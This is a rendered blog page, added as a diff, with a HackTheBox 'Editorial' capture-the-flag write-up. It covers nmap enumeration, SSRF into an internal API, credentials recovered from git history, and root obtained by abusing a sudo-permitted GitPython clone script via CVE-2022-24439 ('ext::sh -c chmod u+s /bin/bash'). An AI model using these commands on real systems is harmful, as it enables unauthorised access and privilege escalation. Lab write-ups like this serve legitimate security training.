@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Editorial Writeup - HackTheBox | Rezy Dev</title>
+<meta name="keywords" content="HackTheBox, Linux, Easy">
+<meta name="description" content="Editorial is an easy Linux machine using an SSRF vulnerability to access an internal API and retrieve SSH credentials. Further Git enumeration reveals more creds, with root access gained via CVE-2022-24439 and misconfigured sudo permissions.">
+<meta name="author" content="Me">
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/editorial/">
+<meta name="google-site-verification" content="XYZabc">
+<meta name="yandex-verification" content="XYZabc">
+<meta name="msvalidate.01" content="XYZabc">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.c8cc592602af07182c5c77ec685d5a345edaf450c20eb609706f559cb037baef.css" integrity="sha256-yMxZJgKvBxgsXHfsaF1aNF7a9FDCDrYJcG9VnLA3uu8=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackthebox/editorial/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><style>
+    @media screen and (min-width: 769px) {
+         
+        .post-content input[type="checkbox"]:checked ~ label > img {
+            transform: scale(1.6);
+            cursor: zoom-out;
+            position: relative;
+            z-index: 999;
+        }
+    
+        .post-content img.zoomCheck {
+            transition: transform 0.15s ease;
+            z-index: 999;
+            cursor: zoom-in;
+        }
+    }
+    </style><meta property="og:url" content="http://localhost:1313/writeups/hackthebox/editorial/">
+  <meta property="og:site_name" content="Rezy Dev">
+  <meta property="og:title" content="Editorial Writeup - HackTheBox">
+  <meta property="og:description" content="Editorial is an easy Linux machine using an SSRF vulnerability to access an internal API and retrieve SSH credentials. Further Git enumeration reveals more creds, with root access gained via CVE-2022-24439 and misconfigured sudo permissions.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-10-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-10-09T00:00:00+00:00">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Easy">
+    <meta property="og:image" content="http://localhost:1313/feature.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/feature.png">
+<meta name="twitter:title" content="Editorial Writeup - HackTheBox">
+<meta name="twitter:description" content="Editorial is an easy Linux machine using an SSRF vulnerability to access an internal API and retrieve SSH credentials. Further Git enumeration reveals more creds, with root access gained via CVE-2022-24439 and misconfigured sudo permissions.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HackTheBox",
+      "item": "http://localhost:1313/writeups/hackthebox/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Editorial Writeup - HackTheBox",
+      "item": "http://localhost:1313/writeups/hackthebox/editorial/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Editorial Writeup - HackTheBox",
+  "name": "Editorial Writeup - HackTheBox",
+  "description": "Editorial is an easy Linux machine using an SSRF vulnerability to access an internal API and retrieve SSH credentials. Further Git enumeration reveals more creds, with root access gained via CVE-2022-24439 and misconfigured sudo permissions.",
+  "keywords": [
+    "HackTheBox", "Linux", "Easy"
+  ],
+  "articleBody": " Link: https://app.hackthebox.com/machines/Editorial Difficulty Easy Machine Linux Enumeration I ran nmap scan quickly on the target machine to reveal open ports on the box.\nPORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack I again ran agressive scan on the box on two open ports again using sudo nmap 10.10.11.20 -T4 -vv -sC -sV -A -O , following is result of the scan:\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM= | 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://editorial.htb |_http-server-header: nginx/1.18.0 (Ubuntu) I added editorial.htb to my /etc/hosts file using command “echo '10.10.11.20 editorial.htb' \u003e\u003e /etc/hosts” and then visited http://editorial.htb the site looks like this:\nUser Flag There is /upload endpoint where we have upload functionality. We might get File Upload to RCE on this box. I will try to upload a reverse shell script to get a shell.\nAfter bit of testing, the form field has cover url section which is actually vulnerable to SSRF and not file upload vulnerability in this website.\nThe following request is vulnerable to SSRF where I will try to\nUpon testing on internal network, I found that there is port 5000 open on this box.\nVisiting the port 5000 response i.e (static/uploads/rrrrrrrr-eeee-zzzz-yyyyy-iscool) reveals the api endpoint:\nI visited the api endpoint and tried to open the file downloaded from the request recieved from the rsponse.\nUpon visiting the endpoint given as by the request from above image, we get a file downloaded in our system.\nThe file contains the username and password for user dev. Using SSH to the user and now we get user flag.\nRoot Flag There is a directory /apps which contains .git in home directory of the user dev.\ndev@editorial:~$ ls apps lol.zip user.txt dev@editorial:~$ cd apps dev@editorial:~/apps$ ls -la total 24 drwxrwxr-x 6 dev dev 4096 Jun 16 08:17 . drwxr-x--- 5 dev dev 4096 Jun 16 08:17 .. drwxrwxr-x 2 dev dev 4096 Jun 16 08:13 app_api drwxrwxr-x 4 dev dev 4096 Jun 16 08:10 app_editorial drwxr-xr-x 8 dev dev 4096 Jun 16 08:09 .git drwxrwxr-x 2 dev dev 4096 Mar 9 2021 GitDump-master I will try to see logs:\ndev@editorial:~/apps$ git log . commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -\u003e master) Author: dev-carlos.valderrama Date: Sun Apr 30 21:04:21 2023 -0500 fix: bugfix in api port endpoint commit dfef9f20e57d730b7d71967582035925d57ad883 Author: dev-carlos.valderrama Date: Sun Apr 30 21:01:11 2023 -0500 change: remove debug and update api port commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae Author: dev-carlos.valderrama Date: Sun Apr 30 20:55:08 2023 -0500 change(api): downgrading prod to dev * To use development environment. commit 1e84a036b2f33c59e2390730699a488c65643d28 Author: dev-carlos.valderrama Date: Sun Apr 30 20:51:10 2023 -0500 feat: create api to editorial info * It (will) contains internal info about the editorial, this enable faster access to information. commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 Author: dev-carlos.valderrama Date: Sun Apr 30 20:48:43 2023 -0500 feat: create editorial app Thee commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae shows that there is change in api downgrading from prod to dev. I will try to show the commit like this:\ndev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae Author: dev-carlos.valderrama Date: Sun Apr 30 20:55:08 2023 -0500 change(api): downgrading prod to dev * To use development environment. diff --git a/app_api/app.py b/app_api/app.py index 61b786f..3373b14 100644 --- a/app_api/app.py +++ b/app_api/app.py @@ -64,7 +64,7 @@ def index(): @app.route(api_route + '/authors/message', methods=['GET']) def api_mail_new_authors(): return jsonify({ - 'template_mail_message': \"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: prod\\nPassword: R3DACTED_PASSWORD\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\\n\\nBest regards, \" + api_editorial_name + \" Team.\" + 'template_mail_message': \"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: dev\\nPassword: R3DACTEDPASSWORD!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\\n\\nBest regards, \" + api_editorial_name + \" Team.\" }) # TODO: replace dev credentials when checks pass # ------------------------------- This has credential for both user prod and dev. Since we are already at user prod, we will change our user to prod.\ndev@editorial:~/apps$ su prod Password: prod@editorial:/home/dev/apps$ By using sudo -l i can see that this user prod can use /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py * as root and we wont be asked for password.\nBelow is the code for the python script /opt/internal_apps/clone_changes/clone_prod_change.py\nprod@editorial:/home/dev/apps$ cat /opt/internal_apps/clone_changes/clone_prod_change.py #!/usr/bin/python3 import os import sys from git import Repo os.chdir('/opt/internal_apps/clone_changes') url_to_clone = sys.argv[1] r = Repo.init('', bare=True) r.clone_from(url_to_clone, 'new_changes', multi_options=[\"-c protocol.ext.allow=always\"]) This script changes the working directory to /opt/internal_apps/clone_changes, initializes a bare Git repository, and clones the repository specified by url_to_clone into a subdirectory named new_changes with a specific Git configuration option.\nDoing few research there is RCE vulnerability for this. If you are interested reading you can read here.\nI will use this script to make /bin/bash suid binary and then use it to get root shell.\nI ran sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'\nAlthough I got errors, it successfully made it suid binary. I simply then ran /bin/bash -p to get root shell.\nprod@editorial:~$ /bin/bash -p bash-5.1# id uid=1000(prod) gid=1000(prod) euid=0(root) groups=1000(prod) There we go. We rooted this box successfully.\nConclusion Thanks for following my writeup. Follow my blogs for more. :D\n",
+  "wordCount" : "965",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/feature.png","datePublished": "2024-10-09T00:00:00Z",
+  "dateModified": "2024-10-09T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Me"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/hackthebox/editorial/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Rezy Dev",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="rezydev.xyz (Alt + H)">rezydev.xyz</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/about/" title="👨🏼‍💻 About">
+                    <span>👨🏼‍💻 About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/writeups/" title="✍️ Writeups">
+                    <span>✍️ Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="📂 Archives">
+                    <span>📂 Archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="🏷️ Tags">
+                    <span>🏷️ Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="🔍 Search (Alt &#43; /)" accesskey=/>
+                    <span>🔍 Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/hackthebox/">HackTheBox</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Editorial Writeup - HackTheBox
+    </h1>
+    <div class="post-description">
+      Editorial is an easy Linux machine using an SSRF vulnerability to access an internal API and retrieve SSH credentials. Further Git enumeration reveals more creds, with root access gained via CVE-2022-24439 and misconfigured sudo permissions.
+    </div>
+    <div class="post-meta"><span title='2024-10-09 00:00:00 +0000 UTC'>October 9, 2024</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;965 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href="https://github.com/Rezy-Dev/Rezy-Dev.github.io/tree/master/content/writeups/HackTheBox/Editorial/index.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+
+</div>
+  </header> 
+<figure class="entry-cover">
+            <img loading="eager" src="http://localhost:1313/writeups/hackthebox/editorial/feature.png" alt="">
+        
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#user-flag">User Flag</a></li>
+    <li><a href="#root-flag">Root Flag</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><table>
+  <thead>
+      <tr>
+          <th>Link:</th>
+          <th><a href="https://app.hackthebox.com/machines/Editorial">https://app.hackthebox.com/machines/Editorial</a></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Difficulty</td>
+          <td>Easy</td>
+      </tr>
+      <tr>
+          <td>Machine</td>
+          <td>Linux</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
+<p>I ran nmap scan quickly on the target machine to reveal open ports on the box.</p>
+<pre tabindex="0"><code>PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+</code></pre><p>I again ran agressive scan on the box on two open ports again using <code>sudo nmap 10.10.11.20 -T4 -vv -sC -sV -A -O</code> , following is result of the scan:</p>
+<pre tabindex="0"><code>PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
+|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://editorial.htb
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+</code></pre><p>I added editorial.htb to my /etc/hosts file using command “<code>echo '10.10.11.20 editorial.htb' &gt;&gt; /etc/hosts</code>” and then visited <code>http://editorial.htb</code> the site looks like this:</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-ea4d8" hidden>
+    <label for="zoomCheck-ea4d8">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="Editorial%20430389d554fb45758990e424591fde42/Untitled.png" alt="Untitled" 
+             />
+    </label></p>
+<h2 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h2>
+<p>There is <code>/upload</code> endpoint where we have upload functionality. We might get File Upload to RCE on this box. I will try to upload a reverse shell script to get a shell.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-3c30e" hidden>
+    <label for="zoomCheck-3c30e">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="Editorial%20430389d554fb45758990e424591fde42/Untitled%201.png" alt="Untitled" 
+             />
+    </label></p>
+<p>After bit of testing, the form field has cover url section which is actually vulnerable to SSRF and not file upload vulnerability in this website.</p>
+<p>The following request is vulnerable to SSRF where I will try to</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-0ef0c" hidden>
+    <label for="zoomCheck-0ef0c">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="Editorial%20430389d554fb45758990e424591fde42/Untitled%202.png" alt="Untitled" 
+             />
+    </label></p>
+<p>Upon testing on internal network, I found that there is port 5000 open on this box.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-da511" hidden>
+    <label for="zoomCheck-da511">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="Editorial%20430389d554fb45758990e424591fde42/Untitled%203.png" alt="Untitled" 
+             />
+    </label></p>
+<p>Visiting the port 5000 response i.e (<code>static/uploads/rrrrrrrr-eeee-zzzz-yyyyy-iscool</code>) reveals the api endpoint:</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-38abb" hidden>
+    <label for="zoomCheck-38abb">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="Editorial%20430389d554fb45758990e424591fde42/Untitled%204.png" alt="Untitled" 
+             />
+    </label></p>
+<p>I visited the api endpoint and tried to open the file downloaded from the request recieved from the rsponse.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-20d61" hidden>
+    <label for="zoomCheck-20d61">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="Editorial%20430389d554fb45758990e424591fde42/Untitled%205.png" alt="Untitled" 
+             />
+    </label></p>
+<p>Upon visiting the endpoint given as by the request from above image, we get a file downloaded in our system.</p>
+<p>The file contains the username and password for user <code>dev</code>. Using SSH to the user and now we get user flag.</p>
+<h2 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h2>
+<p>There is a directory <code>/apps</code> which contains <code>.git</code> in home directory of the user dev.</p>
+<pre tabindex="0"><code>dev@editorial:~$ ls
+apps  lol.zip  user.txt
+dev@editorial:~$ cd apps
+dev@editorial:~/apps$ ls -la
+total 24
+drwxrwxr-x 6 dev dev 4096 Jun 16 08:17 .
+drwxr-x--- 5 dev dev 4096 Jun 16 08:17 ..
+drwxrwxr-x 2 dev dev 4096 Jun 16 08:13 app_api
+drwxrwxr-x 4 dev dev 4096 Jun 16 08:10 app_editorial
+drwxr-xr-x 8 dev dev 4096 Jun 16 08:09 .git
+drwxrwxr-x 2 dev dev 4096 Mar  9  2021 GitDump-master
+</code></pre><p>I will try to see logs:</p>
+<pre tabindex="0"><code>dev@editorial:~/apps$ git log .
+commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -&gt; master)
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 21:04:21 2023 -0500
+
+    fix: bugfix in api port endpoint
+
+commit dfef9f20e57d730b7d71967582035925d57ad883
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 21:01:11 2023 -0500
+
+    change: remove debug and update api port
+
+commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 20:55:08 2023 -0500
+
+    change(api): downgrading prod to dev
+
+    * To use development environment.
+
+commit 1e84a036b2f33c59e2390730699a488c65643d28
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 20:51:10 2023 -0500
+
+    feat: create api to editorial info
+
+    * It (will) contains internal info about the editorial, this enable
+       faster access to information.
+
+commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 20:48:43 2023 -0500
+
+    feat: create editorial app
+</code></pre><p>Thee commit <code>b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae</code> shows that there is change in api downgrading from <code>prod</code> to <code>dev</code>. I will try to show the commit like this:</p>
+<pre tabindex="0"><code>dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 20:55:08 2023 -0500
+
+    change(api): downgrading prod to dev
+    
+    * To use development environment.
+
+diff --git a/app_api/app.py b/app_api/app.py
+index 61b786f..3373b14 100644
+--- a/app_api/app.py
++++ b/app_api/app.py
+@@ -64,7 +64,7 @@ def index():
+ @app.route(api_route + &#39;/authors/message&#39;, methods=[&#39;GET&#39;])
+ def api_mail_new_authors():
+     return jsonify({
+-        &#39;template_mail_message&#39;: &#34;Welcome to the team! We are thrilled to have you on board and can&#39;t wait to see the incredible content you&#39;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: R3DACTED_PASSWORD\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#39;t hesitate to reach out if you have any questions or ideas - we&#39;re always here to support you.\n\nBest regards, &#34; + api_editorial_name + &#34; Team.&#34;
++        &#39;template_mail_message&#39;: &#34;Welcome to the team! We are thrilled to have you on board and can&#39;t wait to see the incredible content you&#39;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: R3DACTEDPASSWORD!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#39;t hesitate to reach out if you have any questions or ideas - we&#39;re always here to support you.\n\nBest regards, &#34; + api_editorial_name + &#34; Team.&#34;
+     }) # TODO: replace dev credentials when checks pass
+ 
+ # -------------------------------
+</code></pre><p>This has credential for both user <code>prod</code> and <code>dev</code>. Since we are already at user prod, we will change our user to <code>prod</code>.</p>
+<pre tabindex="0"><code>dev@editorial:~/apps$ su prod
+Password: 
+prod@editorial:/home/dev/apps$ 
+</code></pre><p>By using <code>sudo -l</code> i can see that this user prod can use <code>/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *</code> as root and we wont be asked for password.</p>
+<p>Below is the code for the python script <code>/opt/internal_apps/clone_changes/clone_prod_change.py</code></p>
+<pre tabindex="0"><code>prod@editorial:/home/dev/apps$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir(&#39;/opt/internal_apps/clone_changes&#39;)
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init(&#39;&#39;, bare=True)
+r.clone_from(url_to_clone, &#39;new_changes&#39;, multi_options=[&#34;-c protocol.ext.allow=always&#34;])
+</code></pre><p>This script changes the working directory to <code>/opt/internal_apps/clone_changes</code>, initializes a bare Git repository, and clones the repository specified by <code>url_to_clone</code> into a subdirectory named <code>new_changes</code> with a specific Git configuration option.</p>
+<p>Doing few research there is RCE vulnerability for this. If you are interested reading you can read <a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">here</a>.</p>
+<p>I will use this script to make /bin/bash suid binary and then use it to get root shell.</p>
+<p>I ran <code>sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'</code></p>
+<p>Although I got errors, it successfully made it suid binary. I simply then ran <code>/bin/bash -p</code> to get root shell.</p>
+<pre tabindex="0"><code>prod@editorial:~$ /bin/bash -p
+bash-5.1# id
+uid=1000(prod) gid=1000(prod) euid=0(root) groups=1000(prod)
+</code></pre><p>There we go. We rooted this box successfully.</p>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>Thanks for following my writeup. Follow my blogs for more. :D</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/hackthebox/">HackTheBox</a></li>
+      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
+      <li><a href="http://localhost:1313/tags/easy/">Easy</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/writeups/hackthebox/boardlight/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>BoardLight Writeup - HackTheBox</span>
+  </a>
+  <a class="next" href="http://localhost:1313/writeups/hackthebox/magicgardens/">
+    <span class="title">Next »</span>
+    <br>
+    <span>MagicGardens Writeup - HackTheBox</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">Rezy Dev</a></span> · 
+
+    <span>
+        <a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="noopener noreferrer" target="_blank">Some rights reserved</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
